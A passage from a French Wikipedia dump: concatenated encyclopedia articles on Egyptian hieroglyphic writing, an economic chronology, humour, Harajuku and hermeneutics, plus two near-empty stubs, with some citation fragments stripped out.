On lit le caractère indépendamment de son sens, selon le principe du rébus. Les phonogrammes sont formés soit d'une consonne (signes dits "mono"- ou "unilitères"), soit de deux (signes "bilitères") ou de trois (signes "trilitères"). Les vingt-quatre signes unilitères constituent le pseudo-alphabet hiéroglyphique (voir plus bas).
L'écriture hiéroglyphique s'apparente à un abjad : elle ne note pas les voyelles, à la différence du cunéiforme par exemple. C'est une écriture défective ("scriptio defectiva").
Ainsi, le hiéroglyphe représentant un canard se lit "s"ȝ, car telles étaient les consonnes du mot désignant cet animal. On peut cependant utiliser le signe du canard sans rapport avec le sens pour représenter les phonèmes "s" et ȝ à la suite (indépendamment des voyelles qui pourraient accompagner ces consonnes) et ainsi écrire des mots comme "s"ȝ, « fils », ou, en complétant avec d'autres signes qu'on détaillera plus loin, "s"ȝ"w", « garder, surveiller », "s"ȝ"tw", « terre ferme » :
L'« alphabet » hiéroglyphique.
Pour certains caractères, le principe du rébus devint celui de l'acrostiche : on ne lit plus que la première consonne du mot.
Ainsi, on peut regrouper les vingt-quatre caractères unilitères en une sorte d'« alphabet » hiéroglyphique, qui, cependant, ne fut jamais utilisé comme tel en remplacement des autres hiéroglyphes, bien que c'eût été possible : en effet, tous les mots égyptiens auraient pu être écrits au moyen de ces seuls signes, mais les Égyptiens n'ont jamais franchi le pas et simplifié leur écriture complexe en alphabet. Le pseudo-alphabet égyptien est donc composé de caractères ne notant qu'une seule consonne, bien que certains d'entre eux en désignent plusieurs quand ils sont employés comme idéogrammes.
Les compléments phonétiques.
L'écriture égyptienne est souvent redondante : en effet, il est très fréquent qu'un mot soit suivi de plusieurs caractères notant les mêmes sons, afin de guider la lecture. Par exemple, le mot "nfr", « beau, bon, parfait », pourrait être écrit au moyen du seul trilitère 
Il est donc écrit "nfr+f+r", mais on lit "nfr".
Les caractères redondants accompagnant les signes bilitères ou trilitères sont appelés « compléments phonétiques ». Ils se placent devant le signe à compléter (rarement), après (en règle générale) ou bien ils l'encadrent, servant ainsi d'aide à la lecture, d'autant que le scribe, pour des raisons de calligraphie, inversait parfois l'ordre des signes (voir plus bas) :
Les compléments phonétiques permettent notamment de différencier les homophones. En effet, les signes n'ont pas toujours une lecture unique : 
La présence de compléments phonétiques permet de savoir quelle lecture suivre :
Enfin, il arrive parfois que des mots aient changé de prononciation par rapport à l'ancien égyptien : dans ce cas, il n'est pas rare que l'écriture adopte un compromis dans la notation, les deux lectures étant indiquées conjointement. C'est le cas notamment pour l'adjectif "bnrj", « doux ("i. e." d'une saveur agréable) », devenu "bnj", et le verbe "swri", « boire », devenu "swj". On les écrit, en moyen égyptien, "bnrj" et "swri", 
Lecture sémantique.
Outre une interprétation phonétique, les caractères peuvent être lus pour leur sens : on parle dans ce cas de logogrammes (plus précisément d'idéogrammes) et de déterminatifs (ou sémagrammes).
Logogrammes.
Un hiéroglyphe utilisé comme logogramme désigne l'objet dont il est l'image. Les logogrammes sont donc le plus souvent des noms communs ; ils sont généralement accompagnés d'un trait vertical muet indiquant leur valeur de logogramme (l'utilisation du trait vertical est détaillée plus bas). En théorie, tout hiéroglyphe aurait pu servir de logogramme. Les logogrammes peuvent être accompagnés de compléments phonétiques. Dans quelques cas, le rapport sémantique est indirect, métonymique ou métaphorique.
Déterminatifs.
Les déterminatifs ou sémagrammes se placent en fin de mot. Ce sont des caractères muets servant à indiquer le champ lexical du mot. Les cas d'homographies étant très fréquents (d'autant plus que seules les consonnes sont écrites), le recours aux déterminatifs est primordial. Si un procédé similaire existait en français, on ferait suivre les mots homographes d'un indice qu'on ne lirait pas, mais qui en préciserait le sens : « vers [poésie] » et le pluriel « vers [animal] » seraient ainsi distingués.
Il existe de nombreux déterminatifs : divinités, humains, parties du corps humain, animaux, plantes, etc. Certains déterminatifs possèdent un sens propre et un sens figuré. Ainsi, le rouleau de papyrus,
Voici quelques exemples d'utilisation des déterminatifs permettant d'en illustrer l'importance :
"Nota :"
Tous ces mots ont la connotation méliorative « bon, beau, parfait ». Un dictionnaire récent indique une vingtaine de mots se lisant "nfr" ou formés à partir de ce mot — preuve de l'extraordinaire richesse de la langue égyptienne.
Sens de lecture.
Les hiéroglyphes s'écrivent de droite à gauche, de gauche à droite ou de haut en bas, la direction usuelle étant de droite à gauche. Le lecteur, pour connaître le sens de lecture, doit considérer la direction dans laquelle sont tournés les hiéroglyphes asymétriques. Par exemple, quand les figures humaines et les animaux, facilement repérables, regardent vers la gauche, il faut lire de gauche à droite, et inversement.
Les mots ne sont pas séparés par des blancs ou des signes de ponctuation. Cependant, certains caractères apparaissent surtout en fin de mot (notamment les déterminatifs, uniquement présents en fin de mot), de sorte qu'il est parfois possible de distinguer les mots par ce biais. Il est évident toutefois que seule une solide connaissance de la langue et de sa syntaxe permet de découper un texte en mots.
Le quadrat.
Les hiéroglyphes ne sont cependant pas simplement alignés les uns à la suite des autres : en effet, chacun s’inscrit harmonieusement dans un carré virtuel (c'est-à-dire non tracé), ou "quadrat" (aussi écrit "cadrat"), à la manière des sinogrammes. À la différence des sinogrammes, cependant, tout caractère ne remplit pas entièrement le quadrat : certains n'en remplissent que la moitié, horizontalement ou verticalement, d'autres le quart.
L'ordre de lecture des éléments disposés à l'intérieur d'un quadrat est indépendant du sens de lecture global, qu'il soit horizontal (quadrats disposés en lignes) ou vertical (quadrats disposés en colonnes). Les signes qui occupent un quadrat se lisent de gauche à droite puis de haut en bas, ou bien de haut en bas puis de gauche à droite.
Particularités calligraphiques et contraintes.
Il existe plusieurs particularités calligraphiques, dont voici les principales : 
Cependant, même si les hiéroglyphes sont inversés, la lecture et la translittération n'en tiennent évidemment pas compte.
Signes annexes.
Trait de remplacement.
Les caractères offensants, funestes, tabous, rares ou complexes peuvent être remplacés par un trait oblique :
Cartouche.
On place dans un cartouche les noms de dieux (exceptionnellement) et les deux derniers noms (roi de Haute et Basse-Égypte et fils de Rê) de la titulature royale (toujours) :
Mais bien que ce soit normalement réservé aux pharaons ou aux dieux, au cours de la Troisième Période intermédiaire, certains grands prêtres d'Amon-Rê faisaient écrire leurs noms dans des cartouches.
Trait de remplissage.
On fait usage du trait de remplissage pour terminer un quadrat qui serait, sinon, incomplet.
Signes agglutinés.
Il existe des signes qui sont la contraction de plusieurs autres. Ces signes ont cependant une existence propre et fonctionnent comme nouveaux signes : par exemple un avant-bras dont la main tient un sceptre sert de déterminatif aux mots signifiant « diriger, conduire » et à leurs dérivés.
Redoublement.
Le redoublement d'un signe indique son duel, le triplement son pluriel.
Signes non figuratifs.
Il s'agit :
L'orthographe.
La notion d'une orthographe « correcte » de l'égyptien hiéroglyphique ne se pose pas dans les mêmes termes que pour les langues modernes. En effet, pour presque chaque mot, il existe une ou plusieurs variantes. Par conséquent, on peut se demander si la notion de correction orthographique n'était pas étrangère à la langue égyptienne. En effet, on y trouve :
Traduction.
En mai 2017, est mise en place la plate-forme VÉgA (Vocabulaire de l'Égyptien Ancien), traducteur de hiéroglyphes en ligne.
Exemples de hiéroglyphes.
Exemples de hiéroglyphes extraits de la "grammaire égyptienne" de Jean-François Champollion (1836).

</doc>
<doc id="1467" url="https://fr.wikipedia.org/wiki?curid=1467" title="Chronologie des faits économiques">
Chronologie des faits économiques

Sont listés dans cette chronologie des faits économiques des évènements importants de l'histoire économique.

Années 1730.
1733.
L'Anglais Cartwright invente, en 1780, le métier à tisser mécanique. Dès lors, un métier à tisser prendra le travail de quatre fileuses.

Années 2000.
2002.
Début : introduction de la monnaie unique européenne (l'euro) billets et pièces
2008.
La crise financière de 2008 se généralise.

</doc>
<doc id="1468" url="https://fr.wikipedia.org/wiki?curid=1468" title="Humour">
Humour

L'humour, au sens large, est une forme d'esprit railleuse .
L'humour est un état d'esprit, une manière d'utiliser le langage, un moyen d'expression. L'humour peut être employé dans différents buts et peut, par exemple, se révéler pédagogique ou militant. Protéiforme, il se retrouve dans un nombre abondant de discours et de situations. Sa forme, plus que sa définition, est diversement appréciée d'une culture à l'autre, d'une région à une autre, d'un point de vue à un autre, à tel point que ce qui est considéré par certains comme de l'humour peut être considéré par d'autres comme une méchante moquerie, une insulte ou un blasphème. Toutefois, rire est bon pour la santé.
L'humour permet aux humains de prendre du recul sur ce qu'ils vivent, comme le remarque Joseph Klatzmann dans son ouvrage "L'Humour juif" en souhaitant « rire pour ne pas pleurer ». Beaumarchais écrivit . Plus pessimiste, Nietzsche affirme « L'homme souffre si profondément qu'il a dû inventer le rire », se rapprochant du cynisme. De même, pour Fred Kassak, grand maître du roman noir humoristique, .
Étymologie.
Le mot humour provient de l'anglais "humour", lui-même emprunté du français «humeur». L'humeur, du latin "" (liquide), désignait initialement les fluides corporels (sang, bile…) pensés comme influençant sur le comportement. L'humour a ainsi longtemps été associé à la théorie des humeurs avant d'être relié à l'histoire de la subjectivité à l'âge moderne et contemporain.
Vers 1760, les Anglais utilisent le terme "humour" dans le sens « tempérament enjoué, gaîté, aptitude à voir ou à faire voir le comique des choses » pour se vanter de posséder un certain état d'esprit, actuellement nommé humour britannique. À la même époque, le sens du mot français « humeur » suit une évolution semblable. Les « humeurs » et l'« humour » lubrifient la vie.
Le mot «humour» est attesté pour la première fois en français au , entré en France grâce aux liens qu'entretenaient les penseurs des Lumières avec les philosophes britanniques. "« La plus perdue de toutes les journées est celle où l'on n'a pas ri. »", selon Nicolas de Chamfort. estiment que la première occurrence du terme "humour" dans la langue française se trouve dans une lettre adressée par Voltaire à Pierre-Joseph Thoulier d'Olivet, dit l'abbé d'Olivet, le 20 août 1761. Voltaire écrit ceci :
À la fin du , quand les auteurs français s'interrogeaient encore sur le sens exact de l'humour anglais, Félix Fénéon définissait ainsi celui de Mark Twain : 
Définition.
Pour Henri Bergson, le rire est avant tout proprement humain : un objet ou un animal font rire uniquement quand ils ont une expression ou une attitude humaine.
Avoir le sens de l'humour, ou simplement avoir de l'humour, c'est mettre les difficultés de la vie à distance, les atténuer par un mot d'esprit. Cette forme d'indifférence a été décrite par Joseph Addison en distinguant le vrai du faux humour : .
, ou une victime s'il le blesse. .
. Cette dernière .
Registre humoristique.
Dans son sens strict, l'humour est une nuance du registre comique qui vise « à attirer l'attention, avec détachement, sur les aspects plaisants ou insolites de la réalité ». Toutefois, dans le langage courant, le sens du terme s'est élargi pour désigner le comique, c'est-à-dire l'ensemble des procédés visant à susciter le rire ou le sourire.
L'humour est indissociable du comique, c'est-à-dire de « ce qui est propre à faire rire » ; le comique est, parmi les registres littéraires, ce qui permet l'humour ; il en existe principalement (situation, mots, gestes, caractère, mœurs, répétition). En sorte, l'humour utilise nécessairement une forme de comique, mais toute manifestation comique n'est pas forcément humoristique.
Auparavant, il était question de trait d'esprit dans le domaine littéraire. Le trait d'esprit se définissait plus comme une forme d'ironie acide et pince-sans-rire, constaté chez des auteurs du siècle des Lumières comme Voltaire, Diderot ou Crébillon fils. Sigmund Freud a étudié le trait d'esprit ("") dans "Le mot d'esprit et sa relation à l'inconscient" (1905). L'humour pratiqué par les Britanniques se révélait cependant plus proche d'une forme de regard absurde et détaché sur les événements, sans forcément conduire à la malveillance vers laquelle tendait souvent l'esprit français.
Pour Paul Reboux (1877-1963), l'humour consiste tout simplement à « traiter à la légère les choses graves, et gravement les choses légères ».
Certaines formes d'humour peuvent utiliser l'ironie ou le sarcasme.
Ainsi, l'humour reste-t-il une notion floue, à la croisée d'autres concepts proches tels que le comique, le trait d'esprit, l'ironie ou le burlesque. Il est d'autant plus difficile à saisir qu'on le retrouve presque partout : ainsi, Dominique Noguez a suggéré qu'il est .
Formes.
Les apparitions les plus connues de l'humour se font dans les histoires amusantes, qualifiées de « drôles », désignées fréquemment sous le vocable de blagues. Il se manifeste cependant de manières très diverses et n'est pas toujours explicite (c'est le cas de l'ironie, de la pointe, de la remarque pince-sans-rire) ; des gestes même peuvent être comiques. Si l'humour est toujours volontaire, un individu peut être comique sans le vouloir.
Ayant pour but de souligner le caractère comique, ridicule, absurde ou insolite de certains aspects de la réalité, l'humour peut se présent sous de nombreuses formes (voir ).
Humour absurde.
L'humour absurde s'appuie sur des situations illogiques ou contradictoires, de façon à faire ressortir l'incohérence de certains aspects de la vie sociale. Dans plusieurs traditions culturelles, notamment en Espagne, il est utilisé comme moyen de commenter la réalité en dévoilant, par l'exagération ou le non-sens, les discordances de certaines facettes de la réalité collective.
Humour noir.
L'humour noir est une forme d'humour qui s'appuie sur des éléments tristes ou désagréables et les tourne en dérision et « rire jaune » un rire forcé et amer. De fait, l'humour n'est pas nécessairement lié à la joie et au bonheur
Humour pince-sans-rire.
L'humour pince-sans-rire est une forme particulière d'humour, caractérisée notamment par l'air sérieux de la personne qui en fait preuve.
L'autodérision.
L'autodérision, soit le fait de se moquer de soi-même, joue un rôle important dans la cohésion sociale. Dans certaines cultures, rire de soi est une pratique valorisée qui permet d'exprimer des tensions internes et de renforcer un sentiment d'identité collective.
Humour d'observation.
L"'humour d'observation" est une forme d'humour se basant sur la caricature de situations du quotidien. C'est la forme d'humour la plus répandue dans le domaine du , particulièrement dans le .
Humour en photographie.
Les photographes français René Maltête et Robert Doisneau ont beaucoup donné dans le genre.
Le magazine "Life" a publié pendant plusieurs années des photographies humoristiques de ses lecteurs.
Recherches.
L'étude de l'humour et ses effets (gélotologie) entre dans le champ disciplinaire de la psychologie, de la philosophie, de la linguistique, de la sociologie, de l'histoire, de la littérature et de la médecine.
Origine et rôle.
Les origines et les fonctions du rire engendré par l'humour sont difficiles à cerner mais il est reconnu depuis l'Antiquité comme ayant une fonction cathartique.
Pour , le rire, constaté chez certaines races de singes, est avant tout le rictus, c'est-à-dire un soulèvement des lèvres afin de montrer les dents ; il pourrait donc être une forme de violence détournée, une inclination à l'agression résumée en une grimace. Vu sous cet angle, l'humour permettrait d'évacuer cette violence, née de la frustration et de la souffrance associées à la fonction cathartique. Le lien avec une sensation de malaise peut se vérifier si la gêne est ressentie par l'auditoire et l'orateur lorsque celui-ci rate un trait d'esprit et ne parvient pas à faire sourire.
Les études démontrent que les cultures n'utilisent pas l'humour de la même manière et que différentes formes d'humour (satire, humour absurde, autodérision, humour populaire) sont mises de l'avant différemment selon les cultures et les époques. Cette diversité confirme que l'humour reflète les structures sociales et les valeurs culturelles. Plusieurs recherches en humour comparé soulignent ainsi que les pratiques humoristiques constituent un indicateur des évolutions sociales.
L'humour est aussi souvent un moyen pour un groupe ou une personne soumis à de fortes pressions sociales ou à de fortes contraintes de s'en échapper. L'exemple le plus frappant en est sans doute l'humour juif.
Thérapie.
Il est empiriquement reconnu que l'humour et son effet direct, le rire, a des effets positifs sur la santé. La science contemporaine a découvert que l'humour et le rire participaient, entre autres, à la décontraction des muscles, à la réduction des hormones de stress, à l'amélioration du système immunitaire, à la réduction de la douleur.
Il existe un yoga du rire développé par le médecin généraliste indien Madan Kataria et sa femme Madhuri, professeure de yoga, qui a modernisé et simplifié le travail des pionniers du rire des années 1960 tels que , Patch Adams, Annette Goodheart, Lee S. Berk, ou Henri Rubinstein en France.
L'humour est également un outil à part entière de l'hypnose ericksonienne. Il permet au thérapeute une communication à plusieurs niveaux : au-delà du sens premier perçu consciemment, une seconde possibilité, voire un champ de possibilités peut être perçu inconsciemment, et donc envisagé. Mettant sur la voie du changement, l'humour génère ainsi du recadrage.
Pédagogie.
L'humour peut se révéler être un outil intéressant pour l'enseignement. Des études ont montré que l'utilisation de l'humour, accompagné d'analogies et de métaphores, permet de mieux mémoriser l'information.
Philosophie.
On ne saurait enfin, bien sûr, passer sous silence son rôle en philosophie, à la fois proche et distinct de celui de l'ironie. Sans même remonter à Hippocrate et surtout aux cyniques grecs, il faudrait se référer à Soeren Kierkegaard. À sa suite, Henri Bergson et Vladimir Jankelevitch ont critiqué l'esprit de sérieux (mais non le sérieux lui-même) dont se couvrent parfois les penseurs.
Psychanalyse.
Freud traite le sujet de « l'humour » au cours de son ouvrage sur "Le mot d'esprit et sa relation à l'inconscient" (1905) dans le cadre théorique de la première topique et dans un bref texte plus tardif intitulé « L'humour » (1927) dans le cadre de la seconde topique.
Humour et politique.
Certains ouvrages ont cherché à se saisir du thème de l'humour depuis la perspective de ses liens avec le champ du politique ou encore comme forme de violence, à commencer par l'ouvrage collectif "Humour et violence symbolique" (Dufort, Roy et Olivier 2020).
Dans plusieurs sociétés où la liberté d'expression était restreinte, notamment en Amérique latine et dans l'Espagne franquiste, la satire et la dérision ont été utilisées comme moyens d'expression détournés. Des chercheurs montrent que ces formes humoristiques ont permis de contourner la censure en formulant des critiques indirectes du pouvoir. L'humour devient un espace symbolique où se déploient commentaires politiques, résistances secrètes et prises de position implicites.
L'humour populaire sert également d'outil d'expression pour les classes défavorisées. Il permet de formuler des critiques de l'ordre social, parfois de manière codée, et de réaffirmer une forme de dignité collective. Le rire devient un espace symbolique de contestation et de résistance, particulièrement lorsque les autres espaces de prise de parole sont restreints.
Certains auteurs, comme l'historien et philosophe britannique Quentin Skinner, font apparaître des usages de l'humour (l'ironie chez Machiavel) ou encore des définitions du rire (notamment chez Hobbes) dans l'historiographie de la pensée politique moderne. Skinner s'intéresse d'ailleurs au recours humoristique et comique de la figure de l'aposiopèse.
D'autres, comme David Owen, ont cherché, depuis le développement d'une certaine philosophie morale, à se saisir du thème de l'humour comme vertu (politique), notamment en relation avec la tolérance : (Owen 2011, p. 386).
Il est d'ailleurs possible de saisir le traitement que Victor Hugo réserve au rire dans "L'Homme qui rit" comme une tentative, par l'introduction de la notion de « rire de force » et par un traitement romanesque du rire comme grimace grotesque, de faire apparaître le thème du rire sous certaines de ses aspects politiques.
Les récentes années ont vu apparaître des études plus spécifiques, notamment sur la charge subversive de l'humour des femmes, ce qui, explique la chercheure Virginie Sauzon, s'avère complexe :

</doc>
<doc id="1469" url="https://fr.wikipedia.org/wiki?curid=1469" title="Hardcore">
Hardcore

Hardcore (HC) est un terme anglais signifiant « noyau dur ». Il peut se référer à :

</doc>
<doc id="1471" url="https://fr.wikipedia.org/wiki?curid=1471" title="Harajuku">
Harajuku

 est un sous-quartier faisant partie du quartier de Jingumae, dans l'arrondissement de Shibuya à Tokyo.
Histoire.
La gare de Harajuku s'ouvre au transport en commun en 1909. Le quartier prend de l'importance avec la construction du Meiji-jingū en 1920, mais reste peu fréquenté. À partir du moment où il est décidé que les Jeux olympiques d'été de 1964 se tiendront à Tokyo, le quartier évolue et de nombreux immeubles et boutiques sont construits. Puis dans les années 1970, Harajuku devient le quartier de la mode, du rock et plus généralement de l'avant-garde.
Dans les années 1990, les grands noms du secteur de l'habillement ouvrent des magasins dans le quartier, et le quartier perd petit à petit son identité, les boutiques les plus singulières migrant dans les années 2000 vers , un ensemble de petites rues aux alentours de Harajuku.
Culture locale et patrimoine.
Le quartier de Harajuku est connu pour abriter l'un des plus célèbres sanctuaires shintoïste, le Meiji-jingū, au milieu du Parc Yoyogi, une forêt artificielle plantée vers 1920.
Ce quartier est fréquenté par un grand nombre de jeunes qui profitent du week-end, durant lequel ils n'ont pas l'obligation de porter l'habituel uniforme, pour se distinguer par leur style vestimentaire. On y voit généralement des adeptes de la mode Lolita, des jeunes gens habillés en chanteur de rock ou en visual kei, et, des cosplayers déguisés en personnage de manga, d'anime ou de jeux vidéo. . Ces modes vestimentaires sont ensuite reprises par les adolescents.
La rue Takeshita-dōri concentre un grand nombre de boutiques qui habillent entre autres les Gothic Lolita, les Cosplay, les Pink, les Sweet Lolita.
La célèbre avenue Omotesandō, les « Champs-Élysées » de Tokyo, relie Harajuku à Aoyama.
Économie.
Le quartier abrite de nombreux sièges sociaux ; les principaux sont ceux des entreprises suivantes :
Éducation.
Le quartier abrite deux écoles primaires, un collège et une bibliothèque.
Transport.
La gare de Harajuku est desservie par la ligne Yamanote de la compagnie JR East.
On trouve également dans le quartier la station de métro Meiji-jingūmae (littéralement « devant Meiji-jingū ») desservie par les lignes Chiyoda et Fukutoshin.

</doc>
<doc id="1475" url="https://fr.wikipedia.org/wiki?curid=1475" title="Hyper Text Transfer Protocol">
Hyper Text Transfer Protocol



</doc>
<doc id="1476" url="https://fr.wikipedia.org/wiki?curid=1476" title="Herméneutique">
Herméneutique

L'herméneutique (du grec , « art d'interpréter ») est la théorie de la lecture, de l'explication et de l'interprétation des textes.
L'herméneutique ancienne est formée de deux approches complètement différentes : la logique d'origine aristotélicienne (à partir du "Peri Hermeneias" ou "De l'interprétation" d'Aristote) d'une part, l'interprétation des textes religieux (orphisme ou herméneutique biblique par exemple) et l'hermétisme d'autre part.
L'herméneutique moderne se décline en sous-disciplines :
Définition générale.
Champs de l'herméneutique.
On parle d'« herméneutique » pour l'interprétation des textes en général.
L'interprétation des Écritures saintes, qu'il s'agisse de la Bible ou du Coran, est un sujet qui demeure délicat. L'interprétation des symboles religieux et des mythes s'appelle l'herméneutique sacrée (ou herméneutique biblique lorsqu'elle se limite à la Bible, c'est-à-dire aux textes du judaïsme et du christianisme). Elle se révèle nécessaire pour le philosophe et théologien Xavier Tilliette, selon lequel « la Bible est un ouvrage complexe et même scellé. Le Livre des livres est un livre de livres. Il est donc susceptible d'interprétation, il ne va pas sans une herméneutique. […] Il n'y a pas d'acheminement direct à la Bible, il faut toujours une médiation au moins implicite ».
L'interprétation de symboles divinatoires fait également appel à des herméneutes, comme en Chine et au Japon, lors de séances de scapulomancie, de plastromancie, d'achilléomancie ou autres formes d'arts divinatoires.
L'étude, la traduction et l'interprétation des textes classiques (antiques) naît à la Renaissance : c'est la philologie.
On désigne aussi par « herméneutique » la réflexion philosophique interprétative, inventée par Friedrich Schleiermacher, développée par Wilhelm Dilthey et rénovée par Martin Heidegger et Hans-Georg Gadamer.
L'herméneutique trouve des applications dans la critique littéraire ou historique, dans le droit, dans la sociologie, en musique, en informatique, en théologie (domaine d'origine), ou même dans le cadre de la psychanalyse. Cette dernière discipline fait néanmoins problème. Ainsi le psychanalyste Jean Laplanche n'admet-il pas que la psychanalyse se trouve « enrôlée » dans l'herméneutique comme .
Questions de méthodologie.
La méthodologie du dévoilement ou de la restitution d'un texte pose deux questions :
Histoire de l'herméneutique.
L'« herméneutique » ancienne.
L'herméneutique est aussi ancienne que le sont les religions, les spiritualités et la philosophie. Cependant, le terme d'herméneutique n'est apparu qu'à l'époque moderne sous la plume de Friedrich Schleiermacher et Wilhelm Dilthey.
D'Aristote à la science contemporaine.
Dans son traité "De l'interprétation" ("Organon" II), Aristote ( av. J.-C) avait défini des règles essentiellement logiques d'interprétation des textes. Il y développe notamment sa théorie du jugement affirmatif et négatif, de la contradiction et de la contrariété. Son point de départ est l'analyse des éléments sémantiques : la lettre, le nom, le verbe, la proposition. Il aboutit à une métaphysique qui hiérarchise les degrés d'être, après avoir exposé la théorie des , laquelle influence les débats médiévaux sur le problème théologique de la prédestination.
Ce traité est abondamment commenté par les philosophes médiévaux Averroès, Thomas d'Aquin, Jean Duns Scot, Guillaume d'Ockham, et fixera pour longtemps la norme de lecture des textes.
Les herméneutes contemporains tels que Umberto Eco ou Paul Ricœur se réclament également de la philosophie aristotélicienne, mais davantage de la "Poétique" et de la "Rhétorique" que de l"Organon" à proprement parler, ce dernier étant plutôt vu comme un prélude à l'élaboration du discours scientifique, que comme un ensemble de traités sur l'interprétation concrète des textes en général.
On peut mesurer ainsi le changement de paradigme de l'époque médiévale à l'époque contemporaine : la logique, c'est-à-dire l'ancienne herméneutique de l"Organon", est devenue la logique symbolique, tandis qu'une nouvelle herméneutique a émergé. Cette dernière explore des champs d'interprétation comme la poétique, la rhétorique, la littérature, mais aussi la sociologie, la psychologie, l'histoire, l'anthropologie. L'une des causes principales de ce changement est la naissance des sciences humaines qui livrent une autre approche du monde que celle des sciences naturelles et de la métaphysique traditionnelle.
Néanmoins, certains auteurs de la deuxième moitié du , comme Paul Feyerabend, soutiennent que le discours scientifique est lui aussi une interprétation du monde et que son mode de production ne diffère pas de celui des autres discours, littéraires, mythologiques.
En ce sens, aucun champ n'échapperait à l'herméneutique, pas même la science dite univoque, c'est-à-dire non sujette aux querelles d'interprétation, et rigoureuse, non affectée par la contingence des images humaines.
Stoïcisme.
Les stoïciens développent un naturalisme herméneutique qui assimile les dieux comme représentations à des forces physiques.
Judaïsme.
La tradition du judaïsme rabbinique connaissait depuis longtemps des règles d'interprétation de la Torah. Hillel Hazaken ( AEC) avait défini sept règles d'interprétation. Rabbi Ishmaël, développant les sept règles d'Hillel, exposa treize principes.
D'autre part, le judaïsme rabbinique connaissait quatre sens (Pardes) pour interpréter la Bible hébraïque : "peshat" (évident, littéral), "remez" (allusif), "drash" (interprétatif), et "sod" (secret/mystique). Par exemple, le sens littéral ("peshat") s'avérait souvent insuffisant pour comprendre en profondeur le sens des textes sacrés.
La kabbale, dès Eléazar de Worms et Abraham Aboulafia (vers 1290), a développé la science des lettres ("hokhmat ha-zeruf") et ses trois procédés pour déchiffrer la Torah.
Dans le judaïsme, la période médiévale a vu le développement de beaucoup de nouvelles catégories d'interprétation rabbinique et d'explication de la Torah, incluant l'émergence de la Kabbale et des écrits de Maïmonide. Les commentaires bibliques et les commentaires du Talmud s'inscrivent dans cette tradition.
Christianisme.
Dans le christianisme, l’herméneutique biblique s’est appuyée sur diverses doctrines.
Origène au a formulé un principe d'interprétation de l'Écriture selon trois sens (littéral, moral et spirituel) à partir de la méthode juive d’interprétation (midrash) utilisée par Paul de Tarse dans l’Épître aux Galates chapitre 4. Il l'appliqua à la prière "(Lectio divina").
Jean Cassien (dont s'inspire la fameuse règle de saint Benoît) l'introduisit dans les monastères.
Hugues de Saint-Victor a contribué à l'herméneutique par son traité "De Scripturis".
Le « système » des quatre sens de l'Écriture ainsi progressivement mis au point pendant le Moyen Âge pour l'interprétation des textes sacrés eut un succès relativement important aux . Il joua un rôle dans la naissance de la scolastique. Par ailleurs, le sens allégorique, l'un des quatre sens, inspira une grande partie de la littérature médiévale profane, à la suite de Prudence.
Pour le philosophe et théologien catholique Xavier Tilliette, …
Renaissance.
Retour à la littéralité.
L'étude et l'interprétation des textes classiques (antiques) naît à la Renaissance : c'est la philologie. Les savants apprennent le grec et le latin, et développent des méthodes pour prouver l'authenticité ou l'inauthenticité d'un texte, et pour établir des éditions critiques des œuvres. C'est le retour aux sources et à la littéralité des textes. L'un des éminents représentants de cette nouvelle tendance est Guillaume Budé, illustre humaniste. L'une des victoires les plus éclatantes de la nouvelle philologie est la démonstration par Lorenzo Valla de la fausseté de la Donation de Constantin. Cet acte porte également une charge politique, car il démonte les fondements de l'autorité papale, qui s'appuyait sur ce fameux texte.
Sous la plume de Martin Luther et Jean Calvin, la Réforme protestante appelle à relire les textes religieux littéralement par-delà les interprétations canoniques de l'Église catholique romaine. Il s'agit de détruire les couches sédimentées de conciles et de doctrines (la tradition), surajoutées aux textes, pour retrouver le texte biblique en sa pureté. Auparavant, la majorité du peuple n'avait pas accès au texte biblique mais seulement aux interprétations qu'en donnaient les autorités religieuses. Avec les mouvements intellectuels de la Réforme et de l'Humanisme, conjoints à l'invention de l'imprimerie et au développement de l'éducation (qui fera reculer l'illettrisme), le texte biblique deviendra de plus en plus accessible et l'autorité religieuse de plus en plus remise en cause quant à la lecture des textes sacrés.
Paradoxalement, cette affirmation selon laquelle la Bible serait claire par elle-même, et donc à lire de manière littérale, amène le lecteur à réinterpréter lui-même le texte sacré sans qu'on ne lui impose des normes interprétatives rigides et incontestables. Le retour à l'« autorité » du texte littéral annonce la multiplicité « anarchique » des interprétations qui ne peuvent plus être unifiées par une autorité normative. L'herméneutique moderne naît de la destruction de la norme : s'il n'y a plus de norme de lecture extérieure au texte, il faut apprendre à déceler soi-même le mécanisme interne d'un texte donné qui produit lui-même son propre sens afin d'éviter la multiplication à l'infini des significations du texte en question, jusqu'à l'absurdité.
Ce retour à la littéralité sera illustré lors du procès de Galilée (1633) au cours duquel les théologiens privilégièrent le sens littéral de la Bible en l'absence de preuves du mouvement de la Terre. Il aura des conséquences considérables dans l'Histoire.
Astrologie et alchimie.
Depuis le au moins, le recours à la pensée magique est connu, mais il est vrai qu’il connaît une nouvelle mode au quand Marsile Ficin édite le "Corpus hermeticum", ensemble de textes anonymes du et que l’on attribue à Hermès Trismégiste, fondateur légendaire de la religion égyptienne, contemporain de Pythagore et de Moïse. Dans cette pensée, le monde animé comme l'inanimé forme un tout continu qui possède une âme : il y a donc des correspondances entre l’Univers et l’Homme qui en est le centre et le reflet en même temps. On raisonne d’ailleurs par analogie : les plantes sont les cheveux du monde, par exemple. L'herméneutique joue ainsi un rôle important dans la médecine de la Renaissance, à la fois dans la pharmacopée (une plante correspondant à un organe) que dans les prescriptions, puisque souvent la consultation et surtout l'administration des médecines sont associées à l'horoscope du patient, les différentes parties du corps trouvant leur correspondance dans les signes zodiacaux.
On est persuadé de la vertu de certains minéraux ou éléments chimiques et notamment du mercure, du soufre. On est ainsi persuadé depuis le qu’il existe un lien entre la pierre philosophale, qui peut transformer tout métal en or, et les calculs rénaux.
Le personnage le plus connu est Paracelse (1493-1541), fils de médecin, à la fois chimiste (travaillant dans les mines) et alchimiste, qui s’intéresse aux correspondances entre les minéraux et l’homme. Il est professeur de médecine à Bâle en 1526. Il a laissé de nombreuses recettes qui emploient l’opium mais aussi des composés minéraux.
Cette démarche explique également l’intérêt pour les traitements par les eaux thermales de Michel Savonarole (1385-1468) : "De omnibus mundi balneis" éditée en 1493 à Bologne. Plus tard, l’université de Padoue confie à trois de ses médecins de faire revivre les bains d’Abano, utilisés dans l’Antiquité ; le célèbre anatomiste Fallope qui enseigne à Padoue est chargé en 1556 d'un enseignement à thermalisme acquis.
Les précurseurs de l'herméneutique contemporaine.
Schleiermacher.
C'est Friedrich Schleiermacher (1768 – 1834) qui posa les bases de l'herméneutique contemporaine. Schleiermacher mit également en évidence le cercle herméneutique (l'expression est de Dilthey). Pour comprendre un texte, il faut avoir compris l'œuvre, mais pour comprendre l'œuvre, il faut avoir compris les textes.
Dilthey.
